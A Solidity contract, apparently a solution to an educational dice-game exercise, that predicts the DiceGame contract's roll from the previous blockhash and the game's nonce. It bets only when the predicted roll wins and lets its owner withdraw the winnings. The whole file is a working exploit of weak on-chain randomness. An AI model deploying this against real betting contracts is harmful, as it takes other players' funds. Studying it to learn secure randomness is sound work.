pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;

    constructor( address payable diceGameAddress ) {
        diceGame = DiceGame( diceGameAddress );
    }


    function withdraw( address _addr, uint256 _amount ) external onlyOwner {
        ( bool sent, ) = _addr.call{ value: _amount }( '' );
        require( sent, 'Something went wrong...' ); 
    }


    function riggedRoll() public {
        require( address( this ).balance >= 0.002 ether, 'At least 0.002 ether required.');

        bytes32 lastHash = blockhash( block.number - 1 );
        uint256 nonce = diceGame.nonce();
        bytes32 randomHash = keccak256(
            abi.encodePacked( 
                lastHash, 
                address( diceGame ), 
                nonce
            )
        );

        uint256 roll = uint256( randomHash ) % 16;
        console.log( 'rolled ', roll );

        if( roll <= 2 ) { }
        require( roll <= 2, 'Well not this time. Your roll must be smaller or equal 2' );
        diceGame.rollTheDice{ value: 0.002 ether }();
    }


    receive() external payable{}
}
